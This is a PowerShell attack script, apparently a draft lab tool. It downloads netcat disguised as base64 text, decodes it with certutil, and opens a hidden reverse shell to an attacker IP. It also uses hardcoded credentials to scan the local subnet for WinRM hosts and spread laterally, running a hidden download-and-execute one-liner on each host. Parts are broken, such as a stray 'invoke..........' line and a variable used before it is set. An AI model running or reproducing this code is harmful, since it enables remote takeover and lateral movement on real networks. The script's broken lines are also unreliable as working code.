#example
powershell calc.exe

Start-BitsTransfer -Source 'https://raw.githubusercontent.com/securethelogs/Powershell/master/Tools/nc.exe'-Destination $env:TEMP\nc.exe.txt
certutil -decode $env:TEMP\nc.exe.txt $env:TEMP\nc.exe

$b = 0
$p = 4444
$tst = $false

while ($b -lt 4 -and $tst -eq $false) {

$an = (Test-NetConnection $atk -Port $p -ErrorAction SilentlyContinue).TcpTestSucceeded

if ($an -eq $true){
$tst = $true
Start-Sleep -Seconds 20
Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-nop $env:TEMP\nc.exe 192.168.1.158 $p -e cmd.exe"

}
$p++
$b++


}




$u = "morty"
$p = "P@ssw0rd"

$atk = "192.168.1.158"

$secpassword = ConvertTo-SecureString $p -AsPlainText -Force
$mycredential = New-Object System.Management.Automation.PSCredential ($u, $secpassword)


  $subnet = (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop
    $manyips = $subnet.Length

    if($manyips -eq 2){$subnet = (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop[1]}
   
    
    
    $subnetrange = $subnet.Substring(0,$subnet.IndexOf('.') + 1 + $subnet.Substring($subnet.IndexOf('.') + 1).IndexOf('.') + 3)
    

    if ($isdot = $subnetrange.EndsWith('.') -eq $false){$subnetrange = $subnetrange + '.'}
    
    
    #$iprange = @(1..254)
    $iprange = @(102)
     
    foreach ($i in $iprange){


$currentip = $subnetrange + $i

$TCPObject = new-Object system.Net.Sockets.TcpClient
$result = $TCPObject.ConnectAsync($currentip, '5985').Wait(50)

if ($result -eq $true){

$islive = Test-WSMan machine-1 -Credential $mycredential -Authentication Negotiate -ErrorAction SilentlyContinue

if ($islive -ne $null){

# **************** what if you just run a powershell invoke for each ********************

invoke..........& powershell

New-Item -Path $env:TEMP -Name "john.ps1"
Add-Content $env:TEMP\john.ps1 -Value 'powershell -nop -w hidden iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/securethelogs/Powershell/master/RuShR3ady.ps1")'
Invoke-Command -ComputerName $currentip -Credential $mycredential -FilePath $env:TEMP\john.ps1

}

}


}


